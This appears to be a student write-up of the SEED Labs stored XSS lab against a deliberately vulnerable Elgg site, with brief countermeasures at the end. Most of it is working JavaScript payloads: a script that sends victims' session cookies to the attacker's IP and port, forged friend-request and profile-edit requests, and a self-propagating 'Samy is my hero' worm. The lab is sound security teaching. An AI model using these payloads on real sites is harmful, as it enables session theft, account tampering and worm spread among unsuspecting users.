# XSS (Cross-site-scripting) attack
SEED Labs Persistent (Stored) XSS attack

**Running:** SEEDUbuntu 16.04 VM
Using Elgg web app, a version with security countermeasures for XSS attacks disabled

## Environment description
- Inside the Elgg web server, we have created the following user accounts:

![user_accounts](https://github.com/peterkarydis/xss-attack/blob/main/images/pic1.png?raw=true)

- Samy is the account the attacker uses

## Activity #1
- We want to display a popup window with a simple message in Alice's browser
- We login as Samy, go to our "Edit profile" page, and inside "Brief description" field we type:
```
<script>alert(‘XSS Attack’);</script>
```
- and hit Save.
![samy_simple_window_script](https://github.com/peterkarydis/xss-attack/blob/main/images/pic2.png?raw=true)
- Then we login as Alice and visit Samys' profile.
![samys_profile_window](https://github.com/peterkarydis/xss-attack/blob/main/images/pic3.png?raw=true)

## Activity #2
- We want to display a popup window with information about Alices' session cookie in her browser
- We login as Samy, go to our "Edit profile" page, and inside "Brief description" field we type:
```
<script>alert(document.cookie);</script>
```
- and hit Save.
![samy_session_window_script](https://github.com/peterkarydis/xss-attack/blob/main/images/pic4.png?raw=true)
- Then we login as Alice and visit Samys' profile.
![samys_profile_window2](https://github.com/peterkarydis/xss-attack/blob/main/images/pic5.png?raw=true)

## Activity #3
- This time Samy wants the Javascript code to send the intercepted cookie back to him. To do this the malicious Javascript code has to send an HTTP GET request back to Samy, with the cookie attached to it.
- We add into the websites' DOM tree an img tag, with its src attribute to point to Samys' IP.
- When the victim's browser meets this tag, it will try to load the image from the URL address that is set in the src field.
- This will lead to the creation of a GET HTTP Request towards Samys' IP.
- Inside his "Brief description" field Samy types:
```
<script>
document.write('<img src=http://192.168.230.135:5555?c=' + escape(document.cookie) + ' >');
</script>
```
![samys_profile_cookie](https://github.com/peterkarydis/xss-attack/blob/main/images/pic6.png?raw=true)
- Then Samy sets up a TCP server that listens to the same port so that he receives the session cookie.
- Alice visits Samys' profile (does not know she was attacked)
- Samy receives her cookie:
![alice's_cookie_received](https://github.com/peterkarydis/xss-attack/blob/main/images/pic7.png?raw=true)

## Activity #4
- Samy wants to force anyone visiting his profile to automatically send him a friend request.
- Samy captures the HTTP Request sent when someone sends him a friend request. To do that, he creates a fake account named Boby to send a friend request to himself.
![boby_friend_request](https://github.com/peterkarydis/xss-attack/blob/main/images/pic8.png?raw=true)
- This way Samy learns that his UserID (GUID) is 47.
- Samy then creates a friend request script and adds it to his "About me" field. 
```
<script type="text/javascript">

window.onload=function() {

var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

//Construct the HTTP request to add Samy as a friend.

var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;

Ajax=new XMLHttpRequest();
Ajax.open("GET",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
Ajax.send();
}
</script>
```
![friend_request_about_me](https://github.com/peterkarydis/xss-attack/blob/main/images/pic9.png?raw=true)
- Now whoever visits Samys' profile automatically sends him a friend request.

## Activity #5
- Samy wants to force anyone visiting his profile to add to his "About me" field the string "Samy is my hero". To do that he captures the HTTP Request created when one updates a field in his profile.
![edit_about_me_request](https://github.com/peterkarydis/xss-attack/blob/main/images/pic10.png?raw=true)
- With that information he writes the malicious script and adds it into his "About me" field.
```
<script type="text/javascript">

window.onload=function() {

// Get the name, guid, Timestamp and Security Token
var name = "&name=" + elgg.session.user.name;
var guid = "&guid=" + elgg.session.user.guid;
var ts = "&__elgg_ts = "+elgg.security.token.__elgg_ts;
var token = "&__elgg_token="+elgg.security.token.__elgg_token;

// Construct the url and the content of the POST request
var desc="&description=Samy is my hero";
var content=name + token + ts + guid + desc;
var sendurl="http://www.xsslabelgg.com/action/profile/edit";
var samyGuid=47;

if(elgg.session.user.guid!=samyGuid) {
// Create and send Ajax request to modify profile
var Ajax=null; 
Ajax=new XMLHttpRequest();
Ajax.open("POST", sendurl, true);
Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send(content);
}
}
</script>
```
![add_script_to_edit_aboutme](https://github.com/peterkarydis/xss-attack/blob/main/images/pic11.png?raw=true)
- Now anyone visiting Samys' profile automatically gets his/her profiles' "About me" field updated like so:
![alice_new_aboutme](https://github.com/peterkarydis/xss-attack/blob/main/images/pic12.png?raw=true)

## Activity #6: Self-Propagating XSS-worm

- Samy alters the javascript code from activity #5 so that it can self-propagate.
- The new javascript code can copy itself straight from the DOM API of the website.
```
<script type="text/javascript" id="worm">
window.onload = function(){
  var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
  var jsCode = document.getElementById("worm").innerHTML;
  var tailTag = "</" + "script>";                                 

  // Put all the pieces together, and apply the URI encoding
  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 

  // Set the content of the description field and access level.
  var desc = "&description=Samy is my hero" + wormCode;
  desc    += "&accesslevel[description]=2";                       

  // Get the name, guid, Timestamp and Security Token
  var name = "&name=" + elgg.session.user.name;
  var guid = "&guid=" + elgg.session.user.guid;
  var ts    = "&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token = "&__elgg_token="+elgg.security.token.__elgg_token;

  // Construct the url and the content of the POST request
  var sendurl="http://www.xsslabelgg.com/action/profile/edit";
  var content = token + ts + name + desc + guid;

  if (elgg.session.user.guid != 47){
    //Create and send Ajax request to modify profile
    var Ajax=null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl,true);
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send(content);
  }
}
```
- Now when Alice visits Samys' profile, her "About Me" profile description changes to "Samy is my hero". And she herself runs the worm, so anyone visiting her profile will have his/her profile "About Me" description changed to "Samy is my hero" and so on.

## Activity #7 Countermeasures
1. Activate the security plugin named HTMLawed. It provides security filtering by verifying user input and removing any tags included.
![HTMLawed_activate](https://github.com/peterkarydis/xss-attack/blob/main/images/pic13.png?raw=true)
2. Inside the web apps' PHP code there should be an htmlspecialchars() function that is used to encode the special characters of the user input. For example the character **<** 
is encoded as **&lt** while the character **>** as **&gt**.